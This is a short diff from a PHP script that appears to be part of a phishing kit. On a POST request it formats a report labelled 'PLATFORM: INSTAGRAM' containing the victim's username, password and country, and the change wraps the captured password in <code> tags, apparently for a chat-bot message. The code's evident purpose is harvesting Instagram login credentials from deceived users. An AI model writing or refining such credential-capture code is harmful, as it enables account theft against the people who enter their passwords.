@@ -220,7 +220,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['user_name'], $_POST['
 DETAILS:
 •📲 PLATFORM: INSTAGRAM
 •👤 UserName: $name
-•🔑 Password: $password
+•🔑 Password: <code>$password</code>
 
 LOCATION:
 •🌍 Country: $country
